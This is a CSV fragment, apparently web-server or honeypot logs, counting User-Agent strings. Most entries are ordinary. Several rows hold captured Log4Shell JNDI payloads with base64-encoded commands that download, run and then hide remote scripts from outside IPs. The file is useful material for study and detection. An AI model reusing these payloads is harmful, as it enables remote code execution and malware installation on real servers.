218,"Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36",1
219,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",1
220,Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:34.0) Gecko/20100101 Firefox/34.0,1
221,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",1
222,"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",1
223,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.794.0 Safari/535.1",1
224,"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",1
225,"""Mozilla/5.0",1
226,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.75 Chrome/68.0.3440.75 Safari/537.36",1
227,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",1
228,Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0,1
229,Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0,1
230,"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11",1
231,"Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-TL00 Build/HUAWEIVNS-TL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1200(0x26060030) NetType/4G Language/zh_CN",1
232,python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.el7.x86_64,1
233,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",1
234,"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G930A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",1
235,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",1
236,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",1
237,"Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/53.0.3036.107 Safari/537.32",1
238,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3887.0 Safari/537.36",1
239,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//205.185.114.157:2420/TomcatBypass/Command/Base64/d2dldCA0Ni4xNDguMjI0LjI3L3dnZXQuc2g7IGNobW9kICt4IHdnZXQuc2g7IC4vd2dldC5zaDsgcm0gLXJmIHdnZXQuc2g=}'),1
240,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",1
241,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8xNTguMTAxLjExOC4yMzYvc3NoZF9wdHk7IGN1cmwgLU8gaHR0cDovMTU4LjEwMS4xMTguMjM2L3NzaGRfcHR5OyBjaG1vZCA3Nzcgc3NoZF9wdHk7IC4vc3NoZF9wdHkgZXhwbG9pdA==}'),1
242,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.801.0 Safari/535.1",1
243,"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16",1
244,Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0,1
245,"Mozilla/5.0 (Linux; Android 8.1.0; LM-X210CMR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",1
246,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36,1
247,Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io),1
248,"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.168.0 Safari/530.1",1
249,"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13",1
250,"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.6 Safari/532.2",1
251,"Lkx-TraversalHttpPlugin/0.0.1 (+https://leakix.net/, +https://twitter.com/HaboubiAnis)",1
252,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",1
253,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",1
254,"Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/52.0.3051.55 Safari/537.32",1
255,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1
256,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",1
257,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0,1
258,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",1
259,Mozilla/5.0 (Windows NT 10.0; WOW64)${jndi:ldap://192.3.194.202:8080/o=tomcat},1
260,lynx,1
261,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0),1
262,"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X; en-US) AppleWebKit/531.5.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6531.5.2",1
263,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",1
264,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",1
265,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//13.78.223.142:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzUxLjE2MS42NC4xOTgvaW5zdGFsbC5zaDsgY2htb2QgNzc3IGluc3RhbGwuc2g7IHNoIGluc3RhbGwuc2g=}'),1
266,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzUxLjE2MS42NC4xOTgvaW5zdGFsbC5zaDsgY2htb2QgNzc3IGluc3RhbGwuc2g7IHNoIGluc3RhbGwuc2g=}'),1
267,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36",1
268,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzE0NS4yMzkuMjM0LjE1NC9iaW5zLnNoIC1vIGJpbnMuc2g7IHdnZXQgaHR0cDovLzE0NS4yMzkuMjM0LjE1NC9iaW5zLnNoOyBjaG1vZCA3NzcgYmlucy5zaDsgLi9iaW5zLnNoOyBybSAtcmYgYmlucy5zaDsgaGlzdG9yeSAtYw==}'),1
269,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",1
270,"Mozilla/5.0 (Linux x86_64; X11) AppleWebKit/536.32 (KHTML, like Gecko) Chrome/22.0.615.43 Safari/536.29",1
271,"""Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML",1
272,"like Gecko) Version/5.1 Safari/534.50""",1
273,"2.0.1) Gecko/20100101 Firefox/4.0.1""",1
274,"like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36""",1
275,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20120422 Firefox/12.0 SeaMonkey/2.9,1
276,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11",1
277,Mozilla/5.0 (X11; OpenBSD amd64; rv:30.0) Gecko/20100101 Firefox/30.0,1
278,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",1
279,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8",1
280,curl/7.55.1,1
281,l9explore/1.3.0,1
282,"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8",1
283,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.55 Safari/525.19",1
284,"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0",1
285,"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",1
286,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4695.0 Safari/537.36",1
287,Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots),1
288,Mozilla,1
289,"Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/51.0.3030.78 Safari/537.32",1
290,Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K),1
291,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27",1
292,curl/7.54.0,1
293,"Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36",1
294,Python-urllib/3.7,1
295,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,1
296,"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",1
297,IE/3.0 (Macintosh 4.0; rv:2.0.1) Gecko/20100101 Firefox/3.3.1,1
298,"Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",1
299,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1",1
300,"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.2 Safari/530.5",1
301,Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0,1
302,Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0,1
303,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0,1
304,Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4,1
305,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0,1
306,"Mozilla/5.0 (Linux; Android 8.0.0; moto e5 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36",1
307,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",1
308,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36",1
309,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36",1
310,wii libnup/1.0,1
311,"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",1
312,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,1
313,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36",1
314,"Mozilla/5.01715179 Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.44",1
315,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",1
316,Mozilla/5.0 (X11; U; Linux Core i7-4980HQ; de; rv:32.0; compatible; JobboerseBot; http://www.jobboerse.com/bot.htm) Gecko/20100101 Firefox/38.0,1
317,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",1
318,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",1
319,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//45.61.187.34:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguOTEuMTQ2L2JpbnMuc2ggLW8gYmlucy5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC45MS4xNDYvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHJtIC1yZiBiaW5zLnNoOyBoaXN0b3J5IC1j}'),1
320,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",1
321,"Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",1
322,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",1
323,"Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",1
324,"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",1
325,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko) Safari/419.3",1
326,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",1
327,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36,1
328,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/36.0.1985.125 Safari/537.36,1
329,User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705,1
330,Mozilla/5.0 (X11; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0,1
331,"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.1 Safari/535.1",1
332,"Mozilla/5.01688858 Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36",1
333,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",1
334,"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",1
335,Mozilla/4.01687919 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; Media Center PC 6.0),1
336,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCBleHBsb2l0Lng4Ng==}'),1
337,WhatsApp/2.22.3.76 i,1
338,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",1
339,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0,1
